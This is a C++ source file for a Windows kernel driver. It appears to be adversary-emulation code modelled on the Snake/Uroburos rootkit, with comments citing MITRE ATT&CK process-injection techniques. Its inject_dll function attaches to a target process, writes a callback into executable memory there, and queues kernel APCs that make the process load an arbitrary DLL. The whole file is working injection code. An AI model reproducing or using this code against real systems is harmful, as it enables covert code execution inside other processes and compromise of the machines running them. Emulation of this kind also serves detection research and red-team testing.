#include "inject.hpp"
#include "attach.hpp"
#include "apc.hpp"
#include "process.hpp"
#include "pe.hpp"

#pragma optimize("", off)
#pragma runtime_checks("", off )
void user_mode_apc_callback(UserApcArgs* args, PVOID, PVOID) {
	args->load_library(args->dll_path);
}

void user_mode_apc_callback_end() {}
#pragma runtime_checks("", restore)
#pragma optimize("", on)

/*
 * inject_dll:
 *      About:
 *          Injects the usermodule DLL into the target process
 *      Result:
 *          Returns STATUS_SUCCESS on success, otherwise some error status.
 *      MITRE ATT&CK Techniques:
 *          T1055.001: Process Injection: Dynamic-link Library Injection
 * 			T1055.004: Process Injection: Asynchronous Procedure Call
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 * 			https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf
 */
NTSTATUS inject_dll(const InjectDllArgs& args, bool force) {
	PVOID injected_apc_callback = nullptr;
	PVOID injected_apc_args = nullptr;

	{ // He has this scope setup strictly to trigger the deconstructor of
	  // ProcessReference which detaches from the target process.

		// Attach to target process
		ProcessReference process_reference{};
		NTSTATUS status = process_reference.init(args.pid, true);
		if (NT_ERROR(status)) {
			return status;
		}

		UserApcArgs user_apc_args{};
		// Why memcpy? Try to remove this after first round of debugging.
		// Keep in mind no STL.
		memcpy(&user_apc_args.dll_path, &args.dll_path, 256);

		// Find the address of LoadLibraryW within the loaded copy of
		// Kernel32.dll. Remember, we are attached to the address space of our
		// target PID.
		user_apc_args.load_library = static_cast<load_library_t>(
			get_module_symbol_address(
				L"KERNEL32.DLL",
				"LoadLibraryW"
			));
		if (nullptr == user_apc_args.load_library) {
			return STATUS_UNSUCCESSFUL;
		}

		// Allocate and copy the dll path to target process
		SIZE_T apc_args_allocation_size = sizeof(UserApcArgs);
		status = ZwAllocateVirtualMemory(
			NtCurrentProcess(),
			&injected_apc_args,
			0,
			&apc_args_allocation_size,
			MEM_COMMIT,
			PAGE_READWRITE
		);
		if (NT_ERROR(status)) {
			return status;
		}

		RtlCopyMemory(injected_apc_args, &user_apc_args, sizeof(UserApcArgs));

		// Allocate and copy the apc user mode callback code to target process
		SIZE_T code_size = reinterpret_cast<ULONG_PTR>(user_mode_apc_callback_end) - reinterpret_cast<ULONG_PTR>(user_mode_apc_callback);

		status = ZwAllocateVirtualMemory(
			NtCurrentProcess(),
			&injected_apc_callback,
			NULL,
			&code_size,
			MEM_COMMIT,
			PAGE_EXECUTE_READWRITE
		);
		if (NT_ERROR(status)) {
			ZwFreeVirtualMemory(
				NtCurrentProcess(),
				&injected_apc_args,
				&apc_args_allocation_size,
				MEM_RELEASE
			);
			return status;
		}

		RtlCopyMemory(
			injected_apc_callback,
			&user_mode_apc_callback,
			reinterpret_cast<uintptr_t>(user_mode_apc_callback_end) - reinterpret_cast<uintptr_t>(user_mode_apc_callback)
		);

	} // Detach from process address space

	ProcessInfo process_info{};
	NTSTATUS status = get_process_info_by_pid(args.pid, &process_info);
	if (NT_ERROR(status)) {
		return status;
	}

	PKTHREAD target_thread{};
	for (size_t i = 0; i < process_info.number_of_threads; i++) {
		if (NT_ERROR(PsLookupThreadByThreadId((HANDLE)process_info.threads_id[i], &target_thread))) {
			return STATUS_UNSUCCESSFUL;
		}

		// Execute LoadLibrary in the target process in order to load our dll
		status = call_apc(target_thread, injected_apc_callback, injected_apc_args, force);
		ObDereferenceObject(target_thread);

		if (NT_SUCCESS(status) && force) {
			break;
		}
	}
    ::ExFreePool(process_info.threads_id);

	return STATUS_SUCCESS;
}